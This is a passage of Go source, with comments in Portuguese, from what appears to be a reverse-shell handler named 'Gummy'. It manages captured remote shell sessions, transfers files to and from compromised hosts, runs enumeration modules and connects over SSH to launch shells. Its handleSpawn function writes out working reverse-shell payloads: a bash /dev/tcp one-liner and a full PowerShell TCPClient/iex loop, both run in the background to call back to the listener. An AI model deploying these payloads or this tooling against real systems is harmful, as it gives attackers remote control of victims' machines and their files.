			if foundWhoami && foundPlatform {
				break
			}
			// Se é timeout mas já lemos algo, continua tentando
			if len(allData) > 0 {
				time.Sleep(200 * time.Millisecond)
				continue
			}
			// Timeout no primeiro read = falha real
			if i == 0 {
				session.Whoami = "unknown"
				session.Platform = "unknown"
				return
			}
			break
		}

		chunk := string(readBuffer[:n])
		allData += chunk

		// Se temos pelo menos uma linha completa, processa
		if strings.Contains(allData, "\n") {
			lines := strings.Split(allData, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)

				// Detecta whoami
				if !foundWhoami && strings.Contains(line, "@") &&
					!strings.Contains(line, "echo") &&
					!strings.Contains(line, "whoami") &&
					!strings.Contains(line, "hostname") &&
					!strings.Contains(line, "USERNAME") &&
					!strings.Contains(line, "COMPUTERNAME") &&
					!strings.Contains(line, "$") &&
					!strings.Contains(line, "%") {

					// Limpa a linha
					cleaned := strings.ReplaceAll(line, "\r", "")
					cleaned = strings.TrimSpace(cleaned)

					// Valida formato básico: palavra@palavra
					parts := strings.Split(cleaned, "@")
					if len(parts) == 2 && len(parts[0]) > 0 && len(parts[1]) > 0 && len(cleaned) < 50 {
						session.Whoami = cleaned
						foundWhoami = true
					}
				}

				// Detecta plataforma
				if !foundPlatform {
					lowerLine := strings.ToLower(line)
					if strings.Contains(lowerLine, "linux") {
						session.Platform = "linux"
						foundPlatform = true
					} else if strings.Contains(lowerLine, "windows") {
						session.Platform = "windows"
						foundPlatform = true
					} else if strings.Contains(lowerLine, "darwin") {
						session.Platform = "macos"
						foundPlatform = true
					}
				}

				// Se encontrou ambos, drena restante e termina
				if foundWhoami && foundPlatform {
					// Drena o restante SINCRONAMENTE (importante!)
					// Isso garante que quando Start() é chamado, não há mais output de detecção
					time.Sleep(200 * time.Millisecond)
					drainBuffer := make([]byte, 4096)
					session.Conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
					for {
						n, err := session.Conn.Read(drainBuffer)
						if err != nil || n == 0 {
							break
						}
					}
					session.Conn.SetReadDeadline(time.Time{})
					return
				}
			}
		}

		// Pequena pausa entre tentativas
		time.Sleep(100 * time.Millisecond)
	}

	// Remove timeout
	session.Conn.SetReadDeadline(time.Time{})

	if !foundWhoami {
		session.Whoami = "unknown"
	}
	if !foundPlatform && session.Platform == "detecting..." {
		session.Platform = "unknown"
	}
}

// monitorSession monitora a saúde da sessão em background
func (m *Manager) monitorSession(session *SessionInfo) {
	for {
		time.Sleep(5 * time.Second) // Verifica a cada 5 segundos

		// Verifica se a sessão ainda existe
		m.mu.RLock()
		_, exists := m.sessions[session.ID]
		m.mu.RUnlock()

		if !exists {
			return // Sessão foi removida, para o monitoramento
		}

		// Testa se a conexão está viva
		session.Conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
		_, err := session.Conn.Write([]byte{})
		session.Conn.SetWriteDeadline(time.Time{})

		if err != nil {
			// Conexão morta, remove a sessão
			fmt.Printf("\r\n%s\r\n", ui.SessionClosed(session.NumID, session.RemoteIP))
			m.RemoveSession(session.ID)

			// Se estava no menu, mostra novo prompt
			if m.menuActive {
				if m.selectedSession != nil {
					fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
				} else {
					fmt.Print(ui.Prompt())
				}
			}
			return
		}
	}
}

// ShellSession entra na shell interativa da sessão selecionada
func (m *Manager) ShellSession() error {
	m.mu.Lock()

	if m.selectedSession == nil {
		m.mu.Unlock()
		return fmt.Errorf("no session selected. Use 'use <id>' first")
	}

	targetSession := m.selectedSession

	// Desativa sessão anterior
	for _, session := range m.sessions {
		session.Active = false
	}

	targetSession.Active = true
	m.activeConn = targetSession.Conn
	m.menuActive = false

	m.mu.Unlock()

	fmt.Println(ui.Info("Entering interactive shell"))
	fmt.Println(ui.CommandHelp("Press F12 to return to menu"))

	// Inicia shell handler (bloqueia até sair)
	err := targetSession.Handler.Start()

	// Quando sair da shell, verificar se sessão ainda existe
	m.mu.Lock()
	if _, exists := m.sessions[targetSession.ID]; exists {
		targetSession.Active = false
	}
	m.activeConn = nil
	m.menuActive = true
	sessionCount := len(m.sessions)
	m.mu.Unlock()

	// Limpa buffer stdin antes de voltar ao menu
	m.flushStdin()

	if sessionCount > 0 {
		m.showMenu()
	} else {
		fmt.Println(ui.Info("No active sessions"))
	}

	return err
}

// StartMenu inicia o loop do menu principal
func (m *Manager) StartMenu() {
	// Setup readline with history
	homeDir, _ := os.UserHomeDir()
	historyFile := filepath.Join(homeDir, ".gummy", "history")

	// Create .gummy directory if it doesn't exist
	os.MkdirAll(filepath.Join(homeDir, ".gummy"), 0755)

	// Create completer
	completer := &GummyCompleter{manager: m}

	rl, err := readline.NewEx(&readline.Config{
		HistoryFile:            historyFile,
		HistoryLimit:           1000,
		DisableAutoSaveHistory: false,
		InterruptPrompt:        "^C",
		EOFPrompt:              "",
		HistorySearchFold:      true,
		AutoComplete:           completer,
	})
	if err != nil {
		fmt.Printf("Warning: readline init failed, using basic input: %v\n", err)
		m.startMenuBasic()
		return
	}
	defer rl.Close()

	for {
		// Só mostra prompt e lê se estivermos no menu
		if m.menuActive {
			// Show appropriate prompt based on selected session
			if m.selectedSession != nil {
				rl.SetPrompt(ui.PromptWithSession(m.selectedSession.NumID))
			} else {
				rl.SetPrompt(ui.Prompt())
			}

			line, err := rl.Readline()
			if err != nil {
				if err == readline.ErrInterrupt {
					// Ctrl+C is disabled - use 'exit', 'quit', or 'q' to exit
					continue
				} else if err == io.EOF {
					// Ignore EOF completely (Ctrl+D, Delete key, etc)
					// Only exit via "exit", "quit", or "q" commands
					continue
				}
				break
			}

			command := strings.TrimSpace(line)
			if command == "" {
				continue
			}

			m.handleCommand(command)
		}
	}
}

// startMenuBasic is a fallback for when readline fails
func (m *Manager) startMenuBasic() {
	for {
		if m.menuActive {
			if m.selectedSession != nil {
				fmt.Print(ui.PromptWithSession(m.selectedSession.NumID))
			} else {
				fmt.Print(ui.Prompt())
			}

			var command string
			fmt.Scanln(&command)
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			m.handleCommand(command)
		}
	}
}

// handleCommand processa comandos do menu
func (m *Manager) handleCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "help", "h":
		m.showHelp()
	case "spawn":
		m.handleSpawn()
	case "ssh":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: ssh user@host"))
			return
		}
		m.handleSSH(parts[1])
	case "rev":
		// Optional: rev [ip] [port]
		ip := m.listenerIP
		port := m.listenerPort

		if len(parts) >= 2 {
			ip = parts[1]
		}
		if len(parts) >= 3 {
			customPort, err := strconv.Atoi(parts[2])
			if err != nil {
				fmt.Println(ui.Error(fmt.Sprintf("Invalid port: %s", parts[2])))
				return
			}
			port = customPort
		}

		m.handleRev(ip, port)
	case "sessions", "list", "ls":
		m.ListSessions()
	case "use":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: use <session_id>"))
			return
		}
		numID, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
			return
		}
		m.UseSession(numID)
	case "shell":
		err := m.ShellSession()
		if err != nil && err != io.EOF {
			fmt.Println(ui.Error(err.Error()))
		}
	case "kill":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: kill <session_id>"))
			return
		}
		numID, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Invalid session ID: %s", parts[1])))
			return
		}
		err = m.KillSession(numID)
		if err != nil {
			fmt.Println(ui.Error(err.Error()))
		}
	case "exit", "quit", "q":
		// Check if there are active sessions
		m.mu.RLock()
		hasActiveSessions := len(m.sessions) > 0
		m.mu.RUnlock()

		if hasActiveSessions {
			// Prompt for confirmation
			if !ui.Confirm("Active sessions detected. Exit anyway?") {
				// fmt.Println(ui.Info("Exit cancelled"))
				return
			}
		}

		fmt.Println(ui.Success("Goodbye!"))
		os.Exit(0)
	case "clear", "cls":
		fmt.Print("\033[2J\033[H")
	case "upload":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: upload <local_path> [remote_path]"))
			return
		}
		remotePath := ""
		if len(parts) >= 3 {
			remotePath = parts[2]
		}
		m.handleUpload(parts[1], remotePath)
	case "download":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: download <remote_path> [local_path]"))
			return
		}
		localPath := ""
		if len(parts) >= 3 {
			localPath = parts[2]
		}
		m.handleDownload(parts[1], localPath)
	case "modules":
		m.handleModulesList()
	case "run":
		if len(parts) < 2 {
			fmt.Println(ui.CommandHelp("Usage: run <module> [args...]"))
			fmt.Println(ui.Info("Type 'modules' to see available modules"))
			return
		}
		m.handleRunModule(parts[1], parts[2:])
	default:
		fmt.Println(ui.Warning(fmt.Sprintf("Unknown command: %s (type 'help' for available commands)", parts[0])))
	}
}

// showMenu mostra o menu principal com sessões ativas
func (m *Manager) showMenu() {
	m.ListSessions()
}

// showHelp mostra ajuda dos comandos
func (m *Manager) showHelp() {
	// Collect all help lines with categories
	var lines []string

	// Connect category
	lines = append(lines, ui.CommandHelp("connect"))
	lines = append(lines, ui.Command("rev [ip] [port]              - Generate reverse shell payloads"))
	lines = append(lines, ui.Command("ssh user@host                - Connect via SSH and execute revshell"))
	lines = append(lines, ui.Command("winrm                        - Connect via WinRM and execute revshell //TODO"))
	lines = append(lines, "")

	// Handler category
	lines = append(lines, ui.CommandHelp("handler"))
	lines = append(lines, ui.Command("sessions, list               - List active sessions"))
	lines = append(lines, ui.Command("use <id>                     - Select session with given ID"))
	lines = append(lines, ui.Command("kill <id>                    - Kill session with given ID"))
	lines = append(lines, "")

	// Session category
	lines = append(lines, ui.CommandHelp("session"))
	lines = append(lines, ui.Command("shell                        - Enter interactive shell"))
	lines = append(lines, ui.Command("upload <local> [remote]      - Upload file to remote system"))
	lines = append(lines, ui.Command("download <remote> [local]    - Download file from remote system"))
	lines = append(lines, ui.Command("spawn                        - Spawn new shell from active session"))
	lines = append(lines, "")

	// Modules category
	lines = append(lines, ui.CommandHelp("modules"))
	lines = append(lines, ui.Command("modules                      - List available modules"))
	lines = append(lines, ui.Command("run <module> [args]          - Run a module (e.g., run enum, run lse)"))
	lines = append(lines, "")

	// Program category
	lines = append(lines, ui.CommandHelp("program"))
	lines = append(lines, ui.Command("help                         - Show this help"))
	lines = append(lines, ui.Command("clear                        - Clear screen"))
	lines = append(lines, ui.Command("exit, quit                   - Exit Gummy"))

	// Render everything inside a box
	fmt.Println(ui.BoxWithTitle(fmt.Sprintf("%s Available Commands", ui.SymbolGem), lines))
}

// GetSessionCount retorna o número de sessões ativas
func (m *Manager) GetSessionCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions)
}

// HasActiveSessions returns true if there are any active sessions
func (m *Manager) HasActiveSessions() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.sessions) > 0
}

// GetAllSessions retorna todas as sessões ativas ordenadas por NumID
func (m *Manager) GetAllSessions() []*SessionInfo {
	m.mu.RLock()
	defer m.mu.RUnlock()

	sessions := make([]*SessionInfo, 0, len(m.sessions))
	for _, session := range m.sessions {
		sessions = append(sessions, session)
	}

	// Sort by NumID
	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].NumID < sessions[j].NumID
	})

	return sessions
}

// flushStdin limpa o buffer stdin para evitar comandos residuais
func (m *Manager) flushStdin() {
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		return
	}

	// Pequena pausa para garantir que dados residuais chegaram
	time.Sleep(10 * time.Millisecond)

	// Flush usando syscall
	syscall.Syscall(syscall.SYS_IOCTL, uintptr(os.Stdin.Fd()), uintptr(0x540B), 0) // TCFLSH
}

// handleUpload handles file upload command
func (m *Manager) handleUpload(localPath, remotePath string) {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Check if local file exists
	if _, err := os.Stat(localPath); os.IsNotExist(err) {
		fmt.Println(ui.Error(fmt.Sprintf("Local file not found: %s", localPath)))
		return
	}

	// Create transferer
	t := NewTransferer(m.selectedSession.Conn, m.selectedSession.ID)

	// Create context with cancel for ESC handling
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start watching for ESC key in background
	go WatchForCancel(ctx, cancel)

	// Show hint
	fmt.Println(ui.CommandHelp("Press ESC to cancel"))

	// Perform upload
	err := t.Upload(ctx, localPath, remotePath)
	if err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Upload failed: %v", err)))
		return
	}

	// Drain any output from transfer commands
	t.DrainOutput()
}

// handleDownload handles file download command
func (m *Manager) handleDownload(remotePath, localPath string) {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Create transferer
	t := NewTransferer(m.selectedSession.Conn, m.selectedSession.ID)

	// Create context with cancel for ESC handling
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start watching for ESC key in background
	go WatchForCancel(ctx, cancel)

	// Show hint
	fmt.Println(ui.CommandHelp("Press ESC to cancel"))

	// Perform download
	err := t.Download(ctx, remotePath, localPath)
	if err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Download failed: %v", err)))
		return
	}

	// Drain any output from transfer commands
	t.DrainOutput()
}

// handleRev generates and displays reverse shell payloads
func (m *Manager) handleRev(ip string, port int) {
	// Validate that we have IP and port
	if ip == "" {
		fmt.Println(ui.Error("No IP address available. Please specify IP with: rev <ip> <port>"))
		return
	}
	if port == 0 {
		fmt.Println(ui.Error("No port available. Please specify port with: rev <ip> <port>"))
		return
	}

	// Create payload generator
	gen := NewReverseShellGenerator(ip, port)

	// Bash payloads
	fmt.Println(ui.CommandHelp("Bash"))
	fmt.Println(gen.GenerateBash())
	fmt.Println(gen.GenerateBashBase64())
	// PowerShell payload
	fmt.Println(ui.CommandHelp("PowerShell"))
	fmt.Println(gen.GeneratePowerShell())
}

// handleSpawn spawns a new reverse shell from the currently selected session
func (m *Manager) handleSpawn() {
	// Check if there's a selected session
	if m.selectedSession == nil {
		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
		return
	}

	// Validate that we have IP and port
	if m.listenerIP == "" {
		fmt.Println(ui.Error("No listener IP available. This shouldn't happen!"))
		return
	}
	if m.listenerPort == 0 {
		fmt.Println(ui.Error("No listener port available. This shouldn't happen!"))
		return
	}

	// Check platform
	platform := m.selectedSession.Platform
	if platform == "detecting..." || platform == "unknown" {
		fmt.Println(ui.Warning("Platform detection incomplete. Attempting with linux payload..."))
		platform = "linux"
	}

	// Generate platform-specific payload
	var payload string
	switch platform {
	case "linux", "macos":
		// Bash reverse shell that runs in background
		payload = fmt.Sprintf("bash -c 'exec bash >& /dev/tcp/%s/%d 0>&1 &'\n",
			m.listenerIP, m.listenerPort)
	case "windows":
		// PowerShell reverse shell (base64 encoded for reliability)
		psScript := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
			m.listenerIP, m.listenerPort)
		// Execute in background with Start-Job
		payload = fmt.Sprintf("powershell -c \"Start-Job -ScriptBlock {%s}\"\n", psScript)
	default:
		fmt.Println(ui.Error(fmt.Sprintf("Unsupported platform: %s", platform)))
		return
	}

	// Send payload silently
	_, err := m.selectedSession.Conn.Write([]byte(payload))
	if err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Failed to send spawn command: %v", err)))
		return
	}

	// Drain command echo BEFORE starting spinner to avoid race condition
	// The remote shell will echo the command, we need to consume it silently
	time.Sleep(150 * time.Millisecond) // Give shell time to echo
	drainBuffer := make([]byte, 4096)
	m.selectedSession.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
	for {
		n, err := m.selectedSession.Conn.Read(drainBuffer)
		if err != nil || n == 0 {
			break
		}
		// Silently discard the echo
	}
	m.selectedSession.Conn.SetReadDeadline(time.Time{})

	// NOW start spinner after draining echo
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Spawning new %s reverse shell...", platform))

	// Wait briefly for connection (max 5 seconds)
	startTime := time.Now()
	maxWait := 5 * time.Second
	initialSessionCount := m.GetSessionCount()

	for time.Since(startTime) < maxWait {
		time.Sleep(200 * time.Millisecond)

		// Check if new session arrived
		if m.GetSessionCount() > initialSessionCount {
			spinner.Stop()
			// Session notification already printed by SessionOpened()
			return
		}
	}

	// Timeout - but connection might still arrive later
	spinner.Stop()
	fmt.Println(ui.Info("Payload sent, waiting for connection..."))
}

// handleSSH connects to a remote host via SSH and executes reverse shell payload
func (m *Manager) handleSSH(target string) {
	// Validate that we have IP and port
	if m.listenerIP == "" {
		fmt.Println(ui.Error("No listener IP available. This shouldn't happen!"))
		return
	}
	if m.listenerPort == 0 {
		fmt.Println(ui.Error("No listener port available. This shouldn't happen!"))
		return
	}

	// Create SSH connector
	connector := NewSSHConnector(m.listenerIP, m.listenerPort)

	// Connect silently (only SSH password prompt will show)
	err := connector.ConnectInteractive(target)
	if err != nil {
		fmt.Println(ui.Error(err.Error()))
		return
	}

	// Success - session should appear in list automatically via SessionOpened()
	// No need to print anything here, the notification will appear when session connects
}
